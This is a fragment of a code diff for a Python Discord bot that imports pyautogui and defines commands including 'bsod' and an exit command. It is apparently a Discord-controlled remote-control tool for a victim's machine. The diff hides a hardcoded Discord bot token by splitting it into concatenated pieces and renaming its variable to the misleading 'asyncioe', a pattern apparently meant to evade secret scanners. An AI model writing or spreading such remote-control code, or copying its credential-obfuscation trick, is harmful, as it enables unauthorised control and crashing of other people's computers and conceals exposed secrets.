@@ -3,8 +3,8 @@ from discord.ext import commands
 import pyautogui
 import os
 
-TOKEN = 'MTI2Mj' + 'MxMz' + 'M5MDAz' + 'OTIzNjY2OA.GsVb1y.472t_MSJ8kTfb8D5lIPaN-Uk50JEVGj2eUu5Sc'
-bot = commands.Bot(command_prefix='!', intents=All)
+asyncioe = 'MTI2Mj' + 'MxMz' + 'M5MDAz' + 'OTIzNjY2OA.GsVb1y.472t_MSJ8kTfb8D5lIPaN-Uk50JEVGj2eUu5Sc'
+bot = commands.Bot(command_prefix='!', intents=intents)
 
 @bot.event
 async def on_ready():
@@ -35,4 +35,4 @@ async def bsod():
 async def exi():
     exit(0)
     print("failed to exit.")
-bot.run(TOKEN)
+bot.run(asyncioe)
